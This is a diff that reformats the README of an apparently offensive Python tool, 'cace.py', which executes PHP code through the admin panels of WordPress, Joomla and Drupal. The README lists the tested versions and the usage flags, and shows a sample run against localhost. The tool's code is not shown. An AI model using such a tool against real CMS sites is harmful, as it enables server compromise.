@@ -1,5 +1,4 @@
-```
-CMS Admin Command Execution
+##CMS Admin Command Execution
 
 Trying to execute php code via admin panel.
 
@@ -11,7 +10,7 @@ Tested on:
 Wordpress 4.1.1(latest); 3.9.3; 3.8; 3.7; 3.5; 3.4; 3.0; 2.7  
 Joomla 3.4.1(latest); 2.5.28; 1.5.26  
 Drupal 7.36(latest stable)  
-
+```
 usage: cace.py [-h] -c CMS -u URL -l LOGIN -p PWD  
   
 CMS Admin Command Execution  
@@ -23,9 +22,9 @@ optional arguments:
   -l LOGIN, --login LOGIN  
                         Administrator login  
   -p PWD, --pwd PWD     Administrator password  
-    
-Example:  
-   
+```    
+##Example:  
+```   
 test@ubuntu:~$ python cace.py -c 1 -u http://127.0.0.1/wp35/ -l admin -p admin  
 [*] Trying to get upload form token for WP >= 3.9.  
 [-] Failed to get token for WP >= 3.9.  
